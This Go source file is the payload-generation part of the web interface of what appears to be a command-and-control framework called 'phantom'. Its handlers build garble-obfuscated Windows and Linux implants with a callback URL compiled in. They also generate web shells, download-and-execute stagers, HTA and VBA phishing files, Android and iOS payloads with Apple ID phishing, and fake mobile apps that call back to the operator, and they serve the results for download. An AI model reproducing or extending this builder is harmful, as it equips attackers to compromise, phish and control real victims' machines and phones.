package webui

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/payloads"
)

// PayloadRequest is the JSON body for payload generation.
type PayloadRequest struct {
	Type        string `json:"type"`         // exe, elf, aspx, php, android, ios, app, etc.
	ListenerURL string `json:"listener_url"` // C2 callback URL
	Sleep       int    `json:"sleep"`        // Agent sleep seconds
	Jitter      int    `json:"jitter"`       // Agent jitter percentage
	Obfuscate   bool   `json:"obfuscate"`    // Use garble
	AppTemplate string `json:"app_template"` // For "app" type — template name
}

// PayloadResponse is returned after generation.
type PayloadResponse struct {
	Success  bool   `json:"success"`
	Message  string `json:"message"`
	Filename string `json:"filename,omitempty"`
	FilePath string `json:"filepath,omitempty"`
	Size     string `json:"size,omitempty"`
	Type     string `json:"type,omitempty"`
}

// handlePayloadTypes returns all available payload types.
func (w *WebUI) handlePayloadTypes(rw http.ResponseWriter, r *http.Request) {
	types := []map[string]interface{}{
		{"id": "exe", "name": "Windows EXE", "icon": "🪟", "category": "Agent Binary", "desc": "Windows executable agent (amd64)"},
		{"id": "exe-garble", "name": "Windows EXE (Obfuscated)", "icon": "🪟", "category": "Agent Binary", "desc": "Garble-obfuscated Windows agent"},
		{"id": "elf", "name": "Linux ELF", "icon": "🐧", "category": "Agent Binary", "desc": "Linux executable agent (amd64)"},
		{"id": "elf-garble", "name": "Linux ELF (Obfuscated)", "icon": "🐧", "category": "Agent Binary", "desc": "Garble-obfuscated Linux agent"},
		{"id": "aspx", "name": "ASPX Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "ASP.NET web shell for IIS servers"},
		{"id": "php", "name": "PHP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "PHP web shell with 5 exec fallbacks"},
		{"id": "jsp", "name": "JSP Web Shell", "icon": "🌐", "category": "Web Shell", "desc": "Java web shell for Tomcat servers"},
		{"id": "powershell", "name": "PowerShell Stager", "icon": "💻", "category": "Stager", "desc": "Download & execute stager for Windows"},
		{"id": "bash", "name": "Bash Stager", "icon": "💻", "category": "Stager", "desc": "Download & execute stager for Linux"},
		{"id": "python", "name": "Python Stager", "icon": "🐍", "category": "Stager", "desc": "Cross-platform Python stager"},
		{"id": "hta", "name": "HTA Application", "icon": "📧", "category": "Phishing", "desc": "HTML Application for Windows phishing"},
		{"id": "vba", "name": "VBA Macro", "icon": "📧", "category": "Phishing", "desc": "Office macro for document phishing"},
		{"id": "android", "name": "Android Payload", "icon": "📱", "category": "Mobile", "desc": "Android stager + APK builder + phishing"},
		{"id": "ios", "name": "iOS Payload", "icon": "🍎", "category": "Mobile", "desc": "iOS MDM profile + Apple ID phishing"},
		{"id": "app", "name": "Fake Mobile App", "icon": "📲", "category": "Mobile", "desc": "Build fake app with C2 callback (30+ templates)"},
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(types)
}

// handlePayloadAppTemplates returns all mobile app templates.
func (w *WebUI) handlePayloadAppTemplates(rw http.ResponseWriter, r *http.Request) {
	var templates []map[string]interface{}
	for cat, apps := range payloads.AppTemplates {
		for _, app := range apps {
			templates = append(templates, map[string]interface{}{
				"name":     strings.ToLower(strings.ReplaceAll(app.Name, " ", "-")),
				"display":  app.Name,
				"icon":     app.Icon,
				"category": cat,
				"desc":     app.Description,
				"perms":    len(app.Permissions),
			})
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(templates)
}

// handlePayloadGenerate builds the requested payload.
func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		rw.Header().Set("Content-Type", "application/json")
		json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "POST required"})
		return
	}

	var req PayloadRequest
	json.NewDecoder(r.Body).Decode(&req)

	if req.ListenerURL == "" {
		req.ListenerURL = "https://127.0.0.1:443"
	}
	if req.Sleep <= 0 {
		req.Sleep = 10
	}
	if req.Jitter <= 0 {
		req.Jitter = 20
	}

	rw.Header().Set("Content-Type", "application/json")

	switch req.Type {
	case "exe", "elf", "exe-garble", "elf-garble":
		resp := w.buildAgentBinary(req)
		json.NewEncoder(rw).Encode(resp)

	case "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba":
		resp := w.generateWebPayload(req)
		json.NewEncoder(rw).Encode(resp)

	case "android":
		output, err := payloads.GenerateAndroidPayload(req.ListenerURL, "build/payloads")
		if err != nil {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
		} else {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "android", FilePath: "build/payloads/"})
		}

	case "ios":
		output, err := payloads.GenerateIOSPayload(req.ListenerURL, "build/payloads")
		if err != nil {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
		} else {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "ios", FilePath: "build/payloads/"})
		}

	case "app":
		if req.AppTemplate == "" {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "app_template is required"})
			return
		}
		output, err := payloads.BuildMobileApp(req.AppTemplate, req.ListenerURL, "build/payloads/apps")
		if err != nil {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: err.Error()})
		} else {
			json.NewEncoder(rw).Encode(PayloadResponse{Success: true, Message: output, Type: "app"})
		}

	default:
		json.NewEncoder(rw).Encode(PayloadResponse{Success: false, Message: "Unknown payload type: " + req.Type})
	}
}

// buildAgentBinary cross-compiles an agent binary.
func (w *WebUI) buildAgentBinary(req PayloadRequest) PayloadResponse {
	targetOS := "linux"
	targetArch := "amd64"
	obfuscate := false

	switch req.Type {
	case "exe":
		targetOS = "windows"
	case "exe-garble":
		targetOS = "windows"
		obfuscate = true
	case "elf-garble":
		obfuscate = true
	}

	os.MkdirAll("build/agents", 0755)

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("phantom-agent_%s_%s%s", targetOS, targetArch, ext)
	if obfuscate {
		filename = fmt.Sprintf("phantom-agent_%s_%s_garbled%s", targetOS, targetArch, ext)
	}
	outputPath := filepath.Join("build", "agents", filename)

	// Build ldflags
	module := "github.com/phantom-c2/phantom/internal/implant"
	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s' -X '%s.SleepSeconds=%d' -X '%s.JitterPercent=%d'",
		module, req.ListenerURL, module, req.Sleep, module, req.Jitter)

	// Embed public key if available
	if w.server.PubKey != nil {
		keyBytes, err := crypto.PublicKeyToBytes(w.server.PubKey)
		if err == nil {
			b64Key := crypto.Base64Encode(keyBytes)
			ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, b64Key)
		}
	}

	// Set environment
	env := os.Environ()
	env = setEnvVar(env, "GOOS", targetOS)
	env = setEnvVar(env, "GOARCH", targetArch)
	env = setEnvVar(env, "CGO_ENABLED", "0")

	// Find project root
	projectRoot := findRoot()

	var cmd *exec.Cmd
	if obfuscate {
		garblePath, err := exec.LookPath("garble")
		if err != nil {
			return PayloadResponse{Success: false, Message: "garble not installed: go install mvdan.cc/garble@latest"}
		}
		cmd = exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
			"build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
	} else {
		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
	}

	cmd.Dir = projectRoot
	cmd.Env = env

	output, err := cmd.CombinedOutput()
	if err != nil {
		return PayloadResponse{Success: false, Message: fmt.Sprintf("Build failed: %s\n%s", err, string(output))}
	}

	info, _ := os.Stat(outputPath)
	size := "unknown"
	if info != nil {
		mb := float64(info.Size()) / 1024 / 1024
		size = fmt.Sprintf("%.1f MB", mb)
	}

	return PayloadResponse{
		Success:  true,
		Message:  fmt.Sprintf("Agent built: %s/%s (%s)", targetOS, targetArch, size),
		Filename: filename,
		FilePath: outputPath,
		Size:     size,
		Type:     req.Type,
	}
}

// generateWebPayload creates web shells and stagers.
func (w *WebUI) generateWebPayload(req PayloadRequest) PayloadResponse {
	cfg := payloads.PayloadConfig{
		Type:        payloads.PayloadType(req.Type),
		ListenerURL: req.ListenerURL,
		OutputPath:  "build/payloads",
	}

	outPath, err := payloads.Generate(cfg)
	if err != nil {
		return PayloadResponse{Success: false, Message: err.Error()}
	}

	info, _ := os.Stat(outPath)
	size := "unknown"
	if info != nil {
		size = fmt.Sprintf("%d bytes", info.Size())
	}

	return PayloadResponse{
		Success:  true,
		Message:  fmt.Sprintf("Payload generated: %s", outPath),
		Filename: filepath.Base(outPath),
		FilePath: outPath,
		Size:     size,
		Type:     req.Type,
	}
}

func setEnvVar(env []string, key, value string) []string {
	prefix := key + "="
	for i, e := range env {
		if strings.HasPrefix(e, prefix) {
			env[i] = prefix + value
			return env
		}
	}
	return append(env, prefix+value)
}

// handlePayloadDownload serves a generated payload file for browser download.
func (w *WebUI) handlePayloadDownload(rw http.ResponseWriter, r *http.Request) {
	filePath := r.URL.Query().Get("file")
	if filePath == "" {
		http.Error(rw, "file parameter required", 400)
		return
	}

	// Security: only allow downloads from build/ directory
	absPath, err := filepath.Abs(filePath)
	if err != nil {
		http.Error(rw, "invalid path", 400)
		return
	}
	buildDir, _ := filepath.Abs("build")
	if !strings.HasPrefix(absPath, buildDir) {
		http.Error(rw, "access denied", 403)
		return
	}

	// Check file exists
	info, err := os.Stat(absPath)
	if err != nil {
		http.Error(rw, "file not found", 404)
		return
	}

	// Set download headers
	filename := filepath.Base(absPath)
	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	rw.Header().Set("Content-Length", fmt.Sprintf("%d", info.Size()))

	// Set content type based on extension
	ext := strings.ToLower(filepath.Ext(filename))
	switch ext {
	case ".exe":
		rw.Header().Set("Content-Type", "application/x-msdownload")
	case ".php", ".jsp", ".aspx", ".py", ".sh", ".ps1", ".vba", ".hta":
		rw.Header().Set("Content-Type", "text/plain")
	case ".html":
		rw.Header().Set("Content-Type", "text/html")
	case ".xml":
		rw.Header().Set("Content-Type", "application/xml")
	case ".mobileconfig":
		rw.Header().Set("Content-Type", "application/x-apple-aspen-config")
	default:
		rw.Header().Set("Content-Type", "application/octet-stream")
	}

	http.ServeFile(rw, r, absPath)
}

func findRoot() string {
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	if runtime.GOOS == "linux" {
		home, _ := os.UserHomeDir()
		if _, err := os.Stat(filepath.Join(home, "phantom", "go.mod")); err == nil {
			return filepath.Join(home, "phantom")
		}
	}
	return "."
}
